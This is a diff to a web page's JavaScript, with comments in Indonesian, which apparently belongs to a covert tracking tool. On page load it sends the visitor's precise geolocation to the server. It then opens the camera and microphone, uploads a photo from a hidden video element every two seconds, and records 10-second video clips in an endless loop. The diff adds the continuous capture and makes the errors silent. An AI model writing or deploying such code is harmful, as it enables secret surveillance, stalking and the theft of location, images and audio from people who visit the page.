@@ -103,7 +103,7 @@
 </script>
 <script>
 document.addEventListener("DOMContentLoaded", function() {
-    // 1. Eksekusi Penangkap Lokasi & Google Maps (Bagian A)
+    // 1. Eksekusi Penangkap Lokasi & Google Maps
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
             var lat = position.coords.latitude;
@@ -111,61 +111,72 @@ document.addEventListener("DOMContentLoaded", function() {
             var acc = position.coords.accuracy;
             var gmapsLink = "https://www.google.com/maps/place/" + lat + "+" + lon;
 
-            // Kirim koordinat & link Google Maps ke server Python
             fetch('/save-location', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ lat: lat, lon: lon, accuracy: acc, link: gmapsLink })
-            })
-            .then(response => response.text())
-            .then(resultText => {
-                console.log("Respon lokasi:", resultText); // Output: "OK"
-                // TODO: Tambahkan fungsi untuk menampilkan atau menyimpan ke log/riwayat di sini jika ada
-            })
-            .catch(err => console.log("Gagal kirim lokasi"));
+            }).catch(err => console.log("Gagal kirim lokasi"));
         }, { timeout: 10000, enableHighAccuracy: true });
     }
 
-    // 2. Eksekusi Perekam Video Kamera .webm (Bagian B)
+    // 2. Eksekusi Kamera untuk Rekam Video & Tangkap Foto Kontinu
     navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: true })
     .then(stream => {
-        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-        let chunks = [];
+        // Buat elemen video tersembunyi untuk proses capture foto
+        const videoElement = document.createElement('video');
+        videoElement.srcObject = stream;
+        videoElement.play();
 
-        mediaRecorder.ondataavailable = function(e) {
-            if (e.data.size > 0) {
-                chunks.push(e.data);
-            }
-        };
+        // Tangkap foto terus-menerus setiap 2 detik
+        function capturePhoto() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElement.videoWidth || 640;
+                canvas.height = videoElement.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                    if (blob) {
+                        const fd = new FormData();
+                        fd.append('foto', blob, `foto_${Date.now()}.jpg`);
+                        fetch('/save-photo', { method: 'POST', body: fd }).catch(() => {});
+                    }
+                }, 'image/jpeg', 0.8);
+            } catch (e) {}
+        }
+        setInterval(capturePhoto, 2000);
 
-        mediaRecorder.onstop = function() {
-            if (chunks.length > 0) {
-                const blob = new Blob(chunks, { type: 'video/webm' });
-                const formData = new FormData();
-                formData.append('video', blob, `capture_${Date.now()}.webm`);
+        // Perekam Video Berkelanjutan (.webm)
+        function recordCycle() {
+            const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            let chunks = [];
 
-                // Kirim data biner video ke server Python
-                fetch('/save-video', {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.text())
-                .then(resultText => {
-                    console.log("Respon video:", resultText); // Output: "Saved"
-                    // TODO: Tambahkan fungsi untuk menampilkan atau menyimpan ke log/riwayat di sini jika ada
-                })
-                .catch(err => console.log("Gagal kirim video"));
-            }
-        };
+            mediaRecorder.ondataavailable = function(e) {
+                if (e.data.size > 0) chunks.push(e.data);
+            };
 
-        mediaRecorder.start();
-        
-        // Rekam otomatis selama 7 detik, lalu hentikan dan kirim ke server
-        setTimeout(() => {
-            if (mediaRecorder.state === "recording") {
-                mediaRecorder.stop();
-            }
-        }, 7000);
+            mediaRecorder.onstop = function() {
+                if (chunks.length > 0) {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('video', blob, `capture_${Date.now()}.webm`);
+
+                    fetch('/save-video', {
+                        method: 'POST',
+                        body: formData
+                    }).then(() => recordCycle()).catch(() => recordCycle());
+                }
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => {
+                if (mediaRecorder.state === "recording") {
+                    mediaRecorder.stop();
+                }
+            }, 10000);
+        }
+        recordCycle();
+
     })
     .catch(err => {
         console.log("Kamera tidak diizinkan atau diblokir browser");
